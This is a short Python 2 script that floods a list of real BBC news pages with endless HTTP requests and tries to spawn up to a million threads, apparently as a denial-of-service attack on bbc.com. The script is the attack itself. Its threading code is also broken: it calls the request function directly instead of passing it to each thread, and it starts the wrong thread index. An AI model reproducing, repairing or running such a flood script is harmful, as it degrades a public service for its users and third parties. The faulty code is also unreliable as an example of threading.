
import urllib2
import time
import threading
links = ["http://www.BBC.com/",
         "http://www.bbc.com/news",
         "http://www.bbc.com/news/video_and_audio/international",
         "http://www.bbc.com/news/world",
         "http://www.bbc.com/news/uk-politics-eu-referendum-35629593",
         "http://www.bbc.com/news/technology",
         "http://www.bbc.com/news/election-us-2016-35636894",
         ]
def requestEngine():
    while True:
        for i in links:
            try:
                urllib2.urlopen(i).read()
            except urllib2.HTTPError:
                print("ERROR:")



threads = []
for i in range(0, 1000000):
    threads.append(threading.Thread(None, requestEngine(), None, None, None, None))
    threads[1].start()
